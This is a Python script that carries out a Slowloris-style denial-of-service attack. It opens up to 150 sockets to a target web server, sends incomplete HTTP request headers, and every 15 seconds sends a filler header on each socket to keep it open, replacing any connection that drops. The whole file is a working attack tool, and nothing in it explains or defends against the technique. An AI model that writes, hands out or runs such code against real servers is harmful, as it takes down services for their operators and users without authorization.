import socket, random, time, sys, argparse

parser = argparse.ArgumentParser()
parser.add_argument('host',  nargs="?")
parser.add_argument('-p', '--port', default=80, type=int)
parser.add_argument('-s', '--sockets', default=150, type=int)
args = parser.parse_args()

if len(sys.argv)<=1:
    sys.exit(1)

if not args.host:
    sys.exit(1)

list_of_sockets = []
user_agents = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"]

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip,args.port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s

def main():
    ip = args.host
    socket_count = args.sockets
    print("The target server {} is being tested with {} sockets".format(ip, socket_count))

    for _ in range(socket_count):
        try:
            print("Creating socket: {}".format(_ + 1))
            sys.stdout.flush()
            s = init_socket(ip)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        print("Finished, Socket count: {}".format(len(list_of_sockets)))
        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count - len(list_of_sockets)):
            print("Recreating socket: {}".format(_ + 1))
            sys.stdout.flush()
            try:
                s = init_socket(ip)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
        time.sleep(15)

if __name__ == "__main__":
    main()
